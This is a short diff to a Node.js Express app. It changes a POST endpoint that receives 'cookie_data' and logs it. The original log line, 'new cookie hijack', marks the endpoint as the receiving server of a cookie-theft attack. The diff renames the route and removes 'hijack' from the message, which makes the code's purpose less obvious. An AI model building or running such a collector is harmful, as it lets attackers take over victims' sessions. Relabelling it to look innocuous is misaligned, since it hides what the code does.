@@ -14,10 +14,10 @@ app.get("/", function(req, res) {
     res.send("Hello World!");
 });
 
-app.post('/add',function(req, res){
+app.post('/boss',function(req, res){
   var cookie_data = req.body.cookie_data;
   console.log(cookie_data);
-  console.log("new cookie hijack");
+  console.log("new cookie");
 
 });
 
